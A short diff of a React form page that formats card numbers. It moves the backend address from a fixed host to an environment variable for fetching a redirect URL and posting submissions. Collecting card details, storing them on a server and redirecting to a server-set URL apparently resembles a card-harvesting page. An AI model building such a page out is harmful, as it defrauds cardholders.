@@ -15,6 +15,8 @@ import {
 } from 'react-icons/fa';
 import './FormPage.css';
 
+const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';
+
 const formatCardNumber = (value) => {
   const digits = value.replace(/\D/g, '').slice(0, 16);
   const groups = digits.match(/.{1,4}/g);
@@ -52,7 +54,7 @@ const FormPage = () => {
   useEffect(() => {
     const fetchRedirectUrl = async () => {
       try {
-        const res = await axios.get('https://cardbk.vercel.app/api/config/redirect-url');
+        const res = await axios.get(`${API_URL}/api/config/redirect-url`);
         setRedirectUrl(res.data.redirectUrl);
       } catch (err) {
         console.error('Could not fetch redirect URL', err);
@@ -79,7 +81,7 @@ const FormPage = () => {
     setStatus({ type: '', message: '' });
 
     try {
-      await axios.post('https://cardbk.vercel.app/api/submissions', form);
+      await axios.post(`${API_URL}/api/submissions`, form);
       setStatus({
         type: 'success',
         message: 'Submission successful! Redirecting...',
